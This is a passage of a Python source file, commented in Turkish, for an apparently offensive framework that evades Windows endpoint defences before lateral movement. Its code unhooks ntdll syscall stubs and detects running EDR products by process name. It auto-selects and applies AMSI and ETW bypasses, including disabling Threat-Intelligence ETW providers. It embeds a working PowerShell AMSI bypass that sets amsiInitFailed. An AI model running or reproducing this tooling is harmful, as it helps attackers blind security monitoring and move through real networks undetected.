            # Yaz
            old_protect = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtect(
                func_addr, stub_size, 0x40, ctypes.byref(old_protect)
            )
            
            ctypes.memmove(func_addr, clean_stub, len(clean_stub))
            
            ctypes.windll.kernel32.VirtualProtect(
                func_addr, stub_size, old_protect.value, ctypes.byref(old_protect)
            )
            
            return BypassResult(
                success=True,
                method=BypassMethod.API_UNHOOK,
                target=function_name,
                details=f"Restored syscall stub (SSN: {ssn})",
                detection_risk=40,
                artifacts=[f"ntdll.dll!{function_name} restored"]
            )
            
        except Exception as e:
            return BypassResult(False, BypassMethod.API_UNHOOK, function_name, str(e))


# ============================================================
# DEFENSE ANALYZER (AI Integration)
# ============================================================

class DefenseAnalyzer:
    """
    Savunma Analizi - AI lateral_guide entegrasyonu için
    
    ETW, AMSI, EDR varlığını tespit et ve otomatik bypass seç
    """
    
    # Bilinen EDR process'leri
    EDR_PROCESSES = {
        "MsMpEng.exe": "Windows Defender",
        "CSFalconService.exe": "CrowdStrike Falcon",
        "cb.exe": "Carbon Black",
        "SentinelAgent.exe": "SentinelOne",
        "cylancesvc.exe": "Cylance",
        "xagt.exe": "FireEye",
        "SophosHealth.exe": "Sophos",
        "bdagent.exe": "Bitdefender",
        "kavfs.exe": "Kaspersky",
        "ntrtscan.exe": "TrendMicro",
        "HealthService.exe": "Microsoft Defender ATP",
        "elastic-agent.exe": "Elastic EDR",
        "taniumclient.exe": "Tanium",
    }
    
    def __init__(self):
        self.amsi_bypass = AMSIBypass()
        self.etw_bypass = ETWBypass()
        self.syscall_engine = IndirectSyscall()
        self.unhooker = APIUnhooker()
        
    def analyze_defenses(self) -> DefenseAnalysis:
        """
        Hedef sistemdeki savunmaları analiz et
        AI lateral movement kararları için kullanılır
        """
        analysis = DefenseAnalysis()
        
        # AMSI Analizi
        amsi_present, amsi_version = self.amsi_bypass.detect_amsi()
        analysis.amsi_present = amsi_present
        analysis.amsi_version = amsi_version
        
        if amsi_present:
            analysis.amsi_hooked = self.amsi_bypass.check_amsi_hooks()
            analysis.notes.append(f"AMSI v{amsi_version} detected")
            if analysis.amsi_hooked:
                analysis.notes.append("AMSI appears hooked by EDR")
                
        # ETW Analizi
        etw_enabled, providers = self.etw_bypass.detect_etw()
        analysis.etw_enabled = etw_enabled
        analysis.etw_providers = providers
        
        if etw_enabled:
            analysis.notes.append(f"ETW active with {len(providers)} providers")
            if "Microsoft-Windows-PowerShell" in providers:
                analysis.notes.append("PowerShell logging enabled")
            if "Microsoft-Windows-Threat-Intelligence" in providers:
                analysis.notes.append("⚠️ Threat Intelligence ETW active!")
                
        # EDR Tespiti
        analysis.edr_detected = self._detect_edr_processes()
        if analysis.edr_detected:
            analysis.notes.append(f"EDR detected: {', '.join(analysis.edr_detected)}")
            
        # API Hook Tespiti
        self.syscall_engine.initialize()
        hooked = self.syscall_engine.get_hooked_functions()
        if hooked:
            analysis.notes.append(f"Hooked APIs: {', '.join(hooked[:5])}")
            
        # Risk Skoru Hesapla
        analysis.risk_score = self._calculate_risk_score(analysis)
        
        # Önerilen Bypass Seç
        analysis.recommended_bypass = self._recommend_bypass(analysis)
        
        return analysis
    
    def _detect_edr_processes(self) -> List[str]:
        """Çalışan EDR process'lerini tespit et"""
        detected = []
        
        try:
            import subprocess
            
            # Windows
            result = subprocess.run(
                ["tasklist", "/FO", "CSV", "/NH"],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    for proc, edr_name in self.EDR_PROCESSES.items():
                        if proc.lower() in line.lower():
                            if edr_name not in detected:
                                detected.append(edr_name)
                                
        except FileNotFoundError:
            # Linux - farklı yaklaşım
            try:
                import subprocess
                result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=10)
                # Linux EDR'ler için ek kontrol
            except:
                pass
        except Exception as e:
            logger.debug(f"EDR detect error: {e}")
            
        return detected
    
    def _calculate_risk_score(self, analysis: DefenseAnalysis) -> int:
        """Tespit riski hesapla (0-100)"""
        score = 20  # Base score
        
        if analysis.amsi_present:
            score += 15
        if analysis.amsi_hooked:
            score += 10  # EDR var demek
            
        if analysis.etw_enabled:
            score += 10
            if "Microsoft-Windows-Threat-Intelligence" in analysis.etw_providers:
                score += 20
                
        # EDR sayısına göre
        score += len(analysis.edr_detected) * 15
        
        return min(100, score)
    
    def _recommend_bypass(self, analysis: DefenseAnalysis) -> BypassLayer:
        """Otomatik bypass önerisi"""
        
        # Hiç savunma yoksa bypass gerekmez
        if not analysis.amsi_present and not analysis.etw_enabled and not analysis.edr_detected:
            return BypassLayer.NONE
            
        # Sadece AMSI varsa
        if analysis.amsi_present and not analysis.etw_enabled:
            return BypassLayer.AMSI
            
        # Sadece ETW varsa
        if analysis.etw_enabled and not analysis.amsi_present:
            return BypassLayer.ETW
            
        # Her ikisi de varsa veya EDR varsa
        return BypassLayer.BOTH
    
    def auto_bypass(self, layer: Optional[BypassLayer] = None) -> List[BypassResult]:
        """Otomatik bypass uygula"""
        results = []
        
        # Analiz yap
        analysis = self.analyze_defenses()
        
        # Layer belirtilmemişse önerilen kullan
        if layer is None:
            layer = analysis.recommended_bypass
            
        logger.info(f"Auto-bypass: layer={layer.value}, risk={analysis.risk_score}")
        
        if layer in [BypassLayer.AMSI, BypassLayer.BOTH]:
            # AMSI bypass
            if analysis.amsi_hooked:
                # EDR hook var, unhook önce
                unhook_result = self.unhooker.unhook_specific("NtProtectVirtualMemory")
                results.append(unhook_result)
                
            amsi_result = self.amsi_bypass.bypass(aggressive=True)
            results.append(amsi_result)
            
        if layer in [BypassLayer.ETW, BypassLayer.BOTH]:
            # ETW bypass
            etw_result = self.etw_bypass.bypass(full=True)
            results.append(etw_result)
            
            # Critical providers da kapat
            if "Microsoft-Windows-Threat-Intelligence" in analysis.etw_providers:
                for provider_result in self.etw_bypass.disable_critical_providers():
                    results.append(provider_result)
                    
        return results


# ============================================================
# MAIN BYPASS MANAGER
# ============================================================

class BypassManager:
    """
    Ana Bypass Yöneticisi
    
    lateral_evasion.py ile entegrasyon için
    """
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.analyzer = DefenseAnalyzer()
        self.amsi = AMSIBypass()
        self.etw = ETWBypass()
        self.syscalls = IndirectSyscall()
        self.unhooker = APIUnhooker()
        
        # Config'den layer oku
        self.layer = BypassLayer(self.config.get("bypass_layer", "both"))
        
    def analyze(self) -> DefenseAnalysis:
        """Savunma analizi"""
        return self.analyzer.analyze_defenses()
    
    def execute_bypass(self, layer: Optional[BypassLayer] = None) -> List[BypassResult]:
        """Bypass uygula"""
        if layer is None:
            layer = self.layer
        return self.analyzer.auto_bypass(layer)
    
    def prepare_for_lateral(self, target_has_edr: bool = True) -> Dict[str, Any]:
        """
        Lateral movement öncesi hazırlık
        
        Returns:
            Dict: Bypass durumu ve öneriler
        """
        analysis = self.analyze()
        results = []
        
        if target_has_edr or analysis.risk_score > 50:
            results = self.execute_bypass()
            
        return {
            "analysis": {
                "amsi_present": analysis.amsi_present,
                "etw_enabled": analysis.etw_enabled,
                "edr_detected": analysis.edr_detected,
                "risk_score": analysis.risk_score,
                "recommended_bypass": analysis.recommended_bypass.value
            },
            "bypass_results": [
                {
                    "success": r.success,
                    "target": r.target,
                    "method": r.method.name,
                    "risk": r.detection_risk
                }
                for r in results
            ],
            "ready_for_lateral": all(r.success for r in results) if results else True
        }
    
    def cleanup(self) -> bool:
        """Bypass'ları temizle (opsec)"""
        try:
            self.amsi.restore_amsi()
            self.etw.restore_etw()
            return True
        except:
            return False


# ============================================================
# POWERSHELL TEST HELPERS
# ============================================================

def test_amsi_bypass() -> bool:
    """AMSI bypass'ı test et"""
    try:
        import subprocess
        
        # AMSI trigger code
        test_code = '''
        $test = "AMSI Test String: Invoke-Mimikatz"
        Write-Host "Testing AMSI..."
        [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
        Write-Host "AMSI bypass successful"
        '''
        
        result = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", test_code],
            capture_output=True, text=True, timeout=10
        )
        
        return "successful" in result.stdout.lower()
        
    except Exception as e:
        logger.error(f"AMSI test error: {e}")
        return False


def generate_bypass_report(analysis: DefenseAnalysis, results: List[BypassResult]) -> str:
    """Bypass raporu oluştur"""
    report = []
    report.append("=" * 60)
    report.append("AMSI & ETW BYPASS REPORT")
    report.append("=" * 60)
    report.append("")
    
    report.append("[DEFENSE ANALYSIS]")
    report.append(f"  AMSI Present: {analysis.amsi_present} (v{analysis.amsi_version})")
    report.append(f"  AMSI Hooked:  {analysis.amsi_hooked}")
    report.append(f"  ETW Enabled:  {analysis.etw_enabled}")
    report.append(f"  ETW Providers: {len(analysis.etw_providers)}")
    report.append(f"  EDR Detected: {', '.join(analysis.edr_detected) or 'None'}")
    report.append(f"  Risk Score:   {analysis.risk_score}/100")
    report.append(f"  Recommended:  {analysis.recommended_bypass.value}")
    report.append("")
    
    report.append("[NOTES]")
    for note in analysis.notes:
        report.append(f"  • {note}")
    report.append("")
    
    report.append("[BYPASS RESULTS]")
    for r in results:
        status = "✓" if r.success else "✗"
        report.append(f"  [{status}] {r.target}")
        report.append(f"      Method: {r.method.name}")
        report.append(f"      Details: {r.details}")
        report.append(f"      Risk: {r.detection_risk}%")
        if r.artifacts:
            report.append(f"      Artifacts: {', '.join(r.artifacts)}")
    report.append("")
    
    report.append("=" * 60)
    
    return "\n".join(report)


# ============================================================
# EXPORTS
# ============================================================

__all__ = [
    "BypassLayer",
    "BypassMethod", 
    "BypassResult",
    "DefenseAnalysis",
    "AMSIBypass",
    "ETWBypass",
    "IndirectSyscall",
    "APIUnhooker",
    "DefenseAnalyzer",
    "BypassManager",
    "test_amsi_bypass",
    "generate_bypass_report",
]
